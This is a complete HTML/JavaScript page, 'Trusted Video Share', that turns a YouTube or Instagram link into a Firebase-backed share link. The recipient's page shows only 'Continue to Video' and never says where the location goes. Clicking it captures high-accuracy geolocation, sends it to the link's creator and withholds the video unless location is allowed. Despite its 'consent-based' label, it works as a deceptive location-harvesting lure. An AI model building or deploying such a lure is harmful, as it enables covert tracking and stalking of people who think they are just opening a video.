<!doctype html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>Trusted Video Share</title>
  <style>
    * {
      box-sizing: border-box
    }

    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background: #f3f6fb;
      color: #172033
    }

    .wrap {
      width: min(92%, 560px);
      margin: 30px auto
    }

    .card {
      background: #fff;
      padding: 24px;
      border-radius: 18px;
      box-shadow: 0 8px 30px rgba(0, 0, 0, .1);
      margin-bottom: 18px
    }

    h1,
    h2 {
      margin-top: 0
    }

    label {
      display: block;
      font-weight: 600;
      margin-bottom: 6px
    }

    input {
      width: 100%;
      padding: 13px;
      border: 1px solid #d5dbe5;
      border-radius: 10px;
      font-size: 16px;
      margin-bottom: 12px
    }

    button {
      width: 100%;
      padding: 13px;
      border: 0;
      border-radius: 10px;
      background: #1769e0;
      color: #fff;
      font-size: 16px;
      cursor: pointer;
      margin-top: 7px
    }

    button:disabled {
      opacity: .55;
      cursor: not-allowed
    }

    .secondary {
      background: #333
    }

    .danger {
      background: #a51d2d
    }

    .small {
      font-size: 14px;
      color: #5f6878;
      line-height: 1.5
    }

    .notice {
      background: #eef6ff;
      padding: 14px;
      border-radius: 12px
    }

    .result {
      background: #edf9f0;
      padding: 14px;
      border-radius: 12px;
      margin-top: 14px;
      word-break: break-word
    }

    .item {
      background: #f7f8fa;
      padding: 14px;
      border-radius: 12px;
      margin-top: 10px
    }

    a {
      color: #1769e0;
      word-break: break-all
    }

    .hidden {
      display: none
    }

    .status {
      margin-top: 12px;
      min-height: 20px
    }
  </style>
</head>

<body>
  <div class="wrap">

    <section id="creator" class="card">
      <h1>🎬 Trusted Video Share</h1>
      <p class="small">Create a consent-based location-sharing link for a trusted person.</p>

      <label for="videoUrl">YouTube / Instagram video URL</label>
      <input id="videoUrl" type="url" placeholder="https://www.youtube.com/...">

      <button id="generate">Generate Share Link</button>
      <div id="creatorStatus" class="status small"></div>

      <div id="generated" class="result hidden">
        <strong>Share link</strong>
        <p id="shareLink"></p>
        <button id="copy" class="secondary">Copy Link</button>
      </div>

      <h2 style="margin-top:28px">📍 Received locations</h2>
      <div id="locations">
        <p class="small">No location received yet.</p>
      </div>
    </section>

    <section id="trusted" class="card hidden">
      <h1>Continue to Video</h1>


      <button id="allow"> Continue</button>
      <button id="deny" class="secondary">Deny & Do Not Continue</button>
      <div id="trustedStatus" class="status small"></div>
    </section>

  </div>

  <script type="module">
    import { initializeApp }
      from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
    import {
      getDatabase, ref, set, push, get, onValue
    } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";

    /* ================= FIREBASE CONFIG =================
       Replace every value below with your Firebase project values.
    ====================================================== */
    const firebaseConfig = {
      apiKey: "AIzaSyBsZyPX3v4fu_avRXQxbJAnJr-v_df4GKBE",
      authDomain: "project-32c34fa0-7362-4442-928.firebaseapp.com",
      databaseURL: "https://project-32c34fa0-7362-4442-928-default-rtdb.firebaseio.com",
      projectId: "project-32c34fa0-7362-4442-928",
      storageBucket: "project-32c34fa0-7362-4442-928.firebasestorage.app",
      messagingSenderId: "9500517407",
      appId: "1:9500517407:web:60806e1a28dcb24f84212a",
      measurementId: "G-TRSZEY6JDV"
    };

    const firebaseConfigured =
      firebaseConfig.apiKey !== "YOUR_API_KEY" &&
      firebaseConfig.projectId !== "YOUR_PROJECT_ID" &&
      firebaseConfig.appId !== "YOUR_APP_ID" &&
      !firebaseConfig.databaseURL.includes("YOUR_PROJECT");

    if (!firebaseConfigured) {
      console.warn("Firebase is not configured. Replace the placeholder values in firebaseConfig.");
    }

    const app = initializeApp(firebaseConfig);
    const db = getDatabase(app);

    const $ = id => document.getElementById(id);
    const params = new URLSearchParams(location.search);
    const shareId = params.get("share");

    const creator = $("creator");
    const trusted = $("trusted");

    function randomId() {
      // Fast, collision-resistant client-side ID.
      if (window.crypto && crypto.getRandomValues) {
        const bytes = new Uint8Array(10);
        crypto.getRandomValues(bytes);
        return Array.from(bytes, b =>
          b.toString(36).padStart(2, "0")
        ).join("").slice(0, 10);
      }

      return Date.now().toString(36) + Math.random().toString(36).slice(2, 6);
    }

    function validVideoUrl(value) {
      try {
        const u = new URL(value);
        return u.protocol === "https:" &&
          /(^|\.)youtube\.com$|(^|\.)youtu\.be$|(^|\.)instagram\.com$/i.test(u.hostname);
      } catch {
        return false;
      }
    }

    /* ================= CREATOR MODE ================= */
    if (!shareId) {
      if (!firebaseConfigured) {
        $("creatorStatus").textContent =
          "Firebase is not configured yet. Replace the YOUR_* values in firebaseConfig.";
      }

      $("generate").addEventListener("click", async () => {
        const videoUrl = $("videoUrl").value.trim();

        if (!validVideoUrl(videoUrl)) {
          $("creatorStatus").textContent =
            "Enter a valid HTTPS YouTube or Instagram URL.";
          return;
        }

        $("generate").disabled = true;
        $("generated").classList.add("hidden");
        $("creatorStatus").textContent = "Creating link…";

        const id = randomId();
        const link =
          location.origin + location.pathname + "?share=" +
          encodeURIComponent(id);

        const shareRef = ref(db, "shares/" + id);

        try {
          // Fail clearly instead of leaving the button spinning forever.
          const writePromise = set(shareRef, {
            videoUrl,
            createdAt: Date.now(),
            status: "waiting"
          });

          await Promise.race([
            writePromise,
            new Promise((_, reject) =>
              setTimeout(() => reject(new Error("Firebase timeout")), 8000)
            )
          ]);

          $("shareLink").textContent = link;
          $("generated").classList.remove("hidden");
          $("creatorStatus").textContent = "Share link created successfully.";
          watchLocations(id);

        } catch (e) {
          console.error("Create link error:", e);

          if (String(e.message).includes("timeout")) {
            $("creatorStatus").textContent =
              "Firebase is taking too long. Check your internet connection and Firebase Database URL/rules.";
          } else if (e && e.code === "PERMISSION_DENIED") {
            $("creatorStatus").textContent =
              "Firebase permission denied. Change your Realtime Database rules.";
          } else {
            $("creatorStatus").textContent =
              "Could not create link. Check Firebase configuration and Realtime Database rules.";
          }
        } finally {
          $("generate").disabled = false;
        }
      });

      $("copy").addEventListener("click", async () => {
        try {
          await navigator.clipboard.writeText($("shareLink").textContent);
          $("copy").textContent = "Copied ✓";
          setTimeout(() => $("copy").textContent = "Copy Link", 1500);
        } catch {
          $("creatorStatus").textContent =
            "Copy failed; copy the displayed link manually.";
        }
      });

      function watchLocations(id) {
        onValue(ref(db, "locations/" + id), snap => {
          const root = $("locations");
          root.innerHTML = "";

          if (!snap.exists()) {
            root.innerHTML = '<p class="small">No location received yet.</p>';
            return;
          }

          const entries = Object.values(snap.val()).reverse();

          for (const loc of entries) {
            const box = document.createElement("div");
            box.className = "item";

            const time = new Date(loc.timestamp).toLocaleString();
            const map = "https://www.google.com/maps?q=" +
              encodeURIComponent(`${loc.latitude},${loc.longitude}`);

            box.innerHTML = `
          <strong>Location received</strong>
          <p class="small">
            Latitude: ${Number(loc.latitude).toFixed(6)}<br>
            Longitude: ${Number(loc.longitude).toFixed(6)}<br>
            Accuracy: approximately ${Math.round(Number(loc.accuracy))} m<br>
            Time: ${time}
          </p>
          <a href="${map}" target="_blank" rel="noopener">Open in Google Maps</a>
        `;
            root.appendChild(box);
          }
        });
      }
    }

    /* ================= TRUSTED PERSON MODE ================= */
    if (shareId) {
      creator.classList.add("hidden");
      trusted.classList.remove("hidden");

      let shareData = null;

      async function loadShare() {
        try {
          const snap = await get(ref(db, "shares/" + shareId));

          if (!snap.exists()) {
            $("trustedStatus").textContent = "This share link is invalid or expired.";
            $("allow").disabled = true;
            return;
          }

          shareData = snap.val();
          $("trustedStatus").textContent =
            "wait....";
        } catch (e) {
          console.error(e);
          $("trustedStatus").textContent =
            "Could not load this link.";
          $("allow").disabled = true;
        }
      }

      loadShare();

      $("allow").addEventListener("click", async () => {
        if (!shareData) return;

        if (!navigator.geolocation) {
          $("trustedStatus").textContent =
            "This browser does not support location access. Video will not open.";
          return;
        }

        $("allow").disabled = true;
        $("deny").disabled = true;
        $("trustedStatus").textContent =
          "Please choose Allow in the browser location permission popup.";

        navigator.geolocation.getCurrentPosition(
          async position => {
            const loc = {
              latitude: Number(position.coords.latitude),
              longitude: Number(position.coords.longitude),
              accuracy: Number(position.coords.accuracy),
              timestamp: Date.now()
            };

            try {
              // Location is written only after the user explicitly grants
              // the browser's location permission.
              const locRef = push(ref(db, "locations/" + shareId));
              await set(locRef, loc);
              await set(ref(db, "shares/" + shareId + "/status"),
                "location_received");

              $("trustedStatus").textContent =
                "Location shared successfully. Opening the video...";

              setTimeout(() => {
                window.location.assign(shareData.videoUrl);
              }, 800);

            } catch (e) {
              console.error(e);
              $("trustedStatus").textContent =
                "Location was allowed, but it could not be saved. Video will not open.";
              $("allow").disabled = false;
              $("deny").disabled = false;
            }
          },

          error => {
            console.warn("Geolocation error:", error);

            $("allow").disabled = false;
            $("deny").disabled = false;

            if (error.code === 1) {
              $("trustedStatus").textContent =
                "Location permission denied. No location was collected and the video will not open.";
            } else if (error.code === 2) {
              $("trustedStatus").textContent =
                "Device location is unavailable. Turn on Location manually and try again.";
            } else if (error.code === 3) {
              $("trustedStatus").textContent =
                "Location request timed out. Please try again.";
            } else {
              $("trustedStatus").textContent =
                "Could not obtain location. The video will not open.";
            }
          },

          {
            enableHighAccuracy: true,
            timeout: 15000,
            maximumAge: 0
          }
        );
      });

      $("deny").addEventListener("click", () => {
        $("allow").disabled = true;
        $("deny").disabled = true;
        $("trustedStatus").textContent =
          "You chose not to share your location. No location was collected and the video will not open.";
      });
    }
  </script>
</body>

</html>
